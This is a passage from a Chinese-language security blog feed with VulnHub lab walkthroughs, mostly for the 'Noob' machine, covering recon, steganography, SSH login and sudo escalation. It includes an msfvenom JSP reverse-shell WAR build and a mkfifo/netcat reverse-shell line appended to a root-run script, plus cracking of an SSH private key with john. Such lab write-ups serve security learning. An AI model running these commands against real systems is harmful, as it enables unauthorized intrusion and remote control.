title="3)反弹shell"></a>3)反弹shell</h4><p>我们可以看到&#x2F;shell和上传页面，那么我们进行shell,在 web 应用程序部署界面尝试在上传 war 包反弹 shell</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129171145361.png" alt="image-20240129171145361"></p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.1.9 LPORT&#x3D;666666 -f war -o MS02423.war<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129172804028.png" alt="image-20240129172804028"></p><p>我们进行上传</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129172724391.png" alt="image-20240129172724391"></p><p>上传成功后，在应用程序列表中看到已成功部署了 war 后门，点击访问后反弹</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129172826998.png" alt="image-20240129172826998"></p><p>我们可以看到反弹成功</p><p>我们进行提权，发现需要密码，我们进行查找</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129173210637.png" alt="image-20240129173210637"></p><h4 id="4-执行脚本"><a href="#4-执行脚本" class="headerlink" title="4)执行脚本"></a>4)执行脚本</h4><p>一般情况下，我们首先去home目录下查看，然后在去&#x2F;var&#x2F;www&#x2F;html&#x2F;目录下查看有没有什么线索，我们看到了thales命令，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130161433886.png" alt="image-20240130161433886"></p><p>我们看到了两个txt文件，模式里面提示我们,一个flag在user.txt，一个在root.txt里面，那么我们进行查看user.txt文件，但是需要thales权限，我们查看notes.txt文件，notes.txt 中告诉我们有一个备用脚本在 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;backup.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">includes <span class="token number">2</span> flags:user.txt and root.txt.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130161558059.png" alt="image-20240130161558059"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130161920839.png" alt="image-20240130161920839"></p><p>我们去执行这个脚本，但是执行之后却发现没有如何变化</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130162200397.png" alt="image-20240130162200397"></p><h4 id="5-ssh-私钥文件"><a href="#5-ssh-私钥文件" class="headerlink" title="5)ssh 私钥文件"></a>5)ssh 私钥文件</h4><p>我们在thales目录下发现了隐藏的.ssh文件，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130162530044.png" alt="image-20240130162530044"></p><p>这样看太难受了，我们进行交互模式进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130162852020.png" alt="image-20240130162852020"></p><p>我们可以看到公钥，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130163048702.png" alt="image-20240130163048702"></p><p>我们把它保存下来，用john进行爆破</p><h4 id="6-john爆破"><a href="#6-john爆破" class="headerlink" title="6)john爆破"></a>6)john爆破</h4><p>将私钥文件保存到攻击机，利用 ssh2john 将私钥转化为 john 能处理的 SHA 加密的文件，然后进行爆破，得到密码为 vodka06</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130170943990.png" alt="image-20240130170943990"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130171014530.png" alt="image-20240130171014530"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130171045172.png" alt="image-20240130171045172"></p><h4 id="7-查看user-txt文件"><a href="#7-查看user-txt文件" class="headerlink" title="7)查看user.txt文件"></a>7)查看user.txt文件</h4><p>我们进行登录thales用户名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130171432515.png" alt="image-20240130171432515"></p><p>我们获取到第一个flag，还有一个flag在root.txt里面，我们进行提权</p><h4 id="8-提权"><a href="#8-提权" class="headerlink" title="8)提权"></a>8)提权</h4><p>之前我们看到的那个脚本还没有查看内容，现在我们查看一下那个备份文件的代码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130171752726.png" alt="image-20240130171752726"></p><p>是一个shell文件，并且是能运行命令的，我们是可以编辑的，并且是root用户运行的，我们插入一串反弹shell的命令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130171844539.png" alt="image-20240130171844539"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc 192.168.1.9 5555 >/tmp/f"</span> <span class="token operator">>></span> backup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130172619811.png" alt="image-20240130172619811"></p><p>等一会可以看到反弹成功，我们查看flag即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130172935974.png" alt="image-20240130172935974"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.msf工具使用</p><p>10.ssh私钥文件</p><p>11.john爆破密码</p><p>12.反弹shell</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之Noob</title>
    <link href="http://ms02423.top/2024/01/28/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BNoob/"/>
    <id>http://ms02423.top/2024/01/28/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BNoob/</id>
    <published>2024-01-28T11:27:34.000Z</published>
    <updated>2024-01-29T16:04:23.215Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">N<span class="token operator">/</span>A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-靶场地址"><a href="#2-靶场地址" class="headerlink" title="2.靶场地址"></a>2.靶场地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>noob-1<span class="token punctuation">,</span><span class="token number">746</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128211902917.png" alt="image-20240128211902917"></p><h2 id="3-启动靶场"><a href="#3-启动靶场" class="headerlink" title="3.启动靶场"></a>3.启动靶场</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128211918357.png" alt="image-20240128211918357"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.72.0&#x2F;24</p><h1 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.72.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.72.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128212323289.png" alt="image-20240128212323289"></p><pre class="line-numbers language-none"><code class="language-none">arp-scan -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128212522845.png" alt="image-20240128212522845"></p><p>靶场真实ip地址为192.168.72.129</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.72.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128212426955.png" alt="image-20240128212426955"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">21</span>端口， vsftpd <span class="token number">3.0</span><span class="token number">.3</span>发现开启了<span class="token number">80</span>端口<span class="token punctuation">,</span> Apache httpd <span class="token number">2.4</span><span class="token number">.29</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token punctuation">)</span>发现开启了<span class="token number">55077</span>端口<span class="token punctuation">,</span>OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>6p1 Ubuntu 4ubuntu0<span class="token punctuation">.</span><span class="token number">5</span> <span class="token punctuation">(</span>Ubuntu Linux; protocol <span class="token number">2.0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我们看到开启了21端口，我们一会可以试试ftp服务</p><p>也可以使用masscan进行探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan <span class="token parameter variable">--rate</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token parameter variable">--ports</span> <span class="token number">0</span>-65535 <span class="token number">192.168</span>.72.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>!<img src="/./../imgs/$%7Bfiilename%7D/image-20240128212851814.png" alt="image-20240128212851814"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.72.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128212951115.png" alt="image-20240128212951115"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.72.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128213218377.png" alt="image-20240128213218377"></p><p>我们可以看到是一个登录页面</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.72.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128213335260.png" alt="image-20240128213335260"></p><p>没有有用的信息</p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.72.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128213528959.png" alt="image-20240128213528959"></p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.72.129 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128213746074.png" alt="image-20240128213746074"></p><p>没有任何信息</p><p>前面我们提到21端口开启，那么我们就服务21端口看看</p><h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-访问21端口"><a href="#1-访问21端口" class="headerlink" title="1)访问21端口"></a>1)访问21端口</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ftp://192.168.72.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128214234920.png" alt="image-20240128214234920"></p><p>我们可以看到2个文件，我们进行查看</p><h4 id="2-查看文件"><a href="#2-查看文件" class="headerlink" title="2)查看文件"></a>2)查看文件</h4><p>我们首先查看cred.txt文件，可以看到是一个base64编码的，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128214550379.png" alt="image-20240128214550379"></p><p>我们可以看到是用户名和密码，我们进行登录试试</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128214819815.png" alt="image-20240128214819815"></p><p>点击About Us,可下载附件downloads.rar</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128214906104.png" alt="image-20240128214906104"></p><p>解压缩后，里面有 3 个文件，其中 sudo 文件内容提示注意文件名sudo</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128215014870.png" alt="image-20240128215014870"></p><p>那么我们就放到kali里面进行查看</p><h4 id="3-图片隐写"><a href="#3-图片隐写" class="headerlink" title="3)图片隐写"></a>3)图片隐写</h4><p>这里我们用的一个图片隐写的工具——steghide</p><p>查看发现 funny.jpg 图片存在隐写的文件，且密码为空</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">steghide  <span class="token parameter variable">--info</span>  <span class="token string">'/home/kali/桌面/downloads/funny.jpg'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128215834066.png" alt="image-20240128215834066"></p><p>使用命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">steghide extract <span class="token parameter variable">-sf</span>  <span class="token string">'/home/kali/桌面/downloads/funny.jpg'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提取出隐写的文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128220028364.png" alt="image-20240128220028364"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128220109025.png" alt="image-20240128220109025"></p><p>查看提取出的 hint.py 文件内容，试着旋转一些单词似乎是在提示 rot13 加密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128220215805.png" alt="image-20240128220215805"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128220429602.png" alt="image-20240128220429602"></p><p>查看发现 funny.bmp 图片也存在隐写的文件，但是不知道密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">steghide  <span class="token parameter variable">--info</span>  <span class="token string">'/home/kali/桌面/downloads/funny.bmp'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128221102248.png" alt="image-20240128221102248"></p><p>想到刚才说注意文件的名称，尝试密码sudo成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128221141855.png" alt="image-20240128221141855"></p><p>提取隐写的文件并查看，发现一段字符串，应该是被打乱了顺序或者加密过</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">steghide extract <span class="token parameter variable">-sf</span>  <span class="token string">'/home/kali/桌面/downloads/funny.bmp'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128221303771.png" alt="image-20240128221303771"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128221333249.png" alt="image-20240128221333249"></p><h4 id="4-rot13-加密"><a href="#4-rot13-加密" class="headerlink" title="4)rot13 加密"></a>4)rot13 加密</h4><p>想到之前 hint.py 里的内容，推测可能是 rot13 加密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128221421699.png" alt="image-20240128221421699"></p><p>我们可以看到这个好像一个账号和密码，在前面扫描的端口当中，我们还有一个55077端口没有使用，服务是ssh服务，我们可以试试</p><h4 id="5-ssh登录"><a href="#5-ssh登录" class="headerlink" title="5)ssh登录"></a>5)ssh登录</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> wtf@192.168.72.129 <span class="token parameter variable">-p</span> <span class="token number">55077</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128222029956.png" alt="image-20240128222029956"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128222044017.png" alt="image-20240128222044017"></p><p>我们可以看到登录成功了</p><h4 id="6-sudo-提权"><a href="#6-sudo-提权" class="headerlink" title="6)sudo 提权"></a>6)sudo 提权</h4><p>查看该用户有哪些 sudo 权限的命令，发现是 ALL</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128222252797.png" alt="image-20240128222252797"></p><p>那么直接提权 sudo su,获取 flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128222357873.png" alt="image-20240128222357873"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.binwalk、steghide 查看是否有隐写文件</p><p>10.ssh登录</p><p>11.base64解密，rot13解密</p><p>12.sudo提权</p><p>13.ftp服务</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之Matrix-Breakout 2 Morpheus</title>
    <link href="http://ms02423.top/2024/01/26/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BMatrix-Breakout/"/>
    <id>http://ms02423.top/2024/01/26/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BMatrix-Breakout/</id>
    <published>2024-01-26T12:50:32.000Z</published>
    <updated>2024-01-29T16:04:03.460Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">This <span class="token keyword">is</span> the second <span class="token keyword">in</span> the Matrix-Breakout series<span class="token punctuation">,</span> subtitled Morpheus<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">.</span> It’s themed <span class="token keyword">as</span> a throwback <span class="token keyword">to</span> the <span class="token keyword">first</span> Matrix movie<span class="token punctuation">.</span> You play Trinity<span class="token punctuation">,</span> trying <span class="token keyword">to</span> investigate a computer <span class="token keyword">on</span> the Nebuchadnezzar that Cypher has locked everyone <span class="token keyword">else</span> out <span class="token keyword">from</span><span class="token punctuation">,</span> which holds the <span class="token keyword">key</span> <span class="token keyword">to</span> a mystery<span class="token punctuation">.</span>Difficulty<span class="token punctuation">:</span> Medium-Hard <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2-靶场地址"><a href="#2-靶场地址" class="headerlink" title="2.靶场地址"></a>2.靶场地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>matrix-breakout-2-morpheus<span class="token punctuation">,</span><span class="token number">757</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126205617771.png" alt="image-20240126205617771"></p><h2 id="3-启动靶场"><a href="#3-启动靶场" class="headerlink" title="3.启动靶场"></a>3.启动靶场</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126205642803.png" alt="image-20240126205642803"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><h1 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.52.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126205804406.png" alt="image-20240126205804406"></p><pre class="line-numbers language-none"><code class="language-none">arp-scan -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126210338945.png" alt="image-20240126210338945"></p><p>靶场真实ip地址为192.168.52.135</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.52.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126210944454.png" alt="image-20240126210944454"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">80</span>端口，APache httpd <span class="token number">2.4</span><span class="token number">.51</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Debian<span class="token punctuation">)</span><span class="token punctuation">)</span>发现开启了<span class="token number">22</span>端口<span class="token punctuation">,</span>OpenSSH <span class="token number">8</span><span class="token punctuation">.</span>4p1 Debian <span class="token number">5</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开启了<span class="token number">81</span>端口<span class="token punctuation">,</span>nginx <span class="token number">1.18</span><span class="token number">.0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>也可以使用masscan进行探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan <span class="token parameter variable">--rate</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token parameter variable">--ports</span> <span class="token number">0</span>-65535 <span class="token number">192.168</span>.52.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126210530329.png" alt="image-20240126210530329"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.52.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211229279.png" alt="image-20240126211229279"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211330248.png" alt="image-20240126211330248"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.52.135:81<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211351460.png" alt="image-20240126211351460"></p><p>访问81端口，发现需要账号密码，尝试了一下弱口令，未能成功登录。</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.52.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211525473.png" alt="image-20240126211525473"></p><p>没有有用的信息</p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.52.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211638612.png" alt="image-20240126211638612"></p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.52.135 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211907378.png" alt="image-20240126211907378"></p><p>扫描到一个robots.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211845683.png" alt="image-20240126211845683"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126212009937.png" alt="image-20240126212009937"></p><p>没有任何信息</p><p>截止到目前，我们没有找到任何有用的信息，我们可以换一个思路进行</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">还是将重点放回<span class="token number">80</span>端口，因为robot<span class="token punctuation">.</span>txt提示我们继续找找，可能是因为我们的字典太小了，我们换个扫描器换个字典试下<span class="token punctuation">,</span>我们使用另外两个字典进行扫描<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ffuf <span class="token parameter variable">-u</span> http://192.168.52.135/FUZZ <span class="token parameter variable">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="token parameter variable">-c</span> <span class="token parameter variable">-ic</span> <span class="token parameter variable">-e</span> .txt,.zip,.php,html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126220323300.png" alt="image-20240126220323300"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126220400619.png" alt="image-20240126220400619"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.52.135 <span class="token parameter variable">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="token parameter variable">-x</span> php,txt,html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126221049984.png" alt="image-20240126221049984"></p><pre class="line-numbers 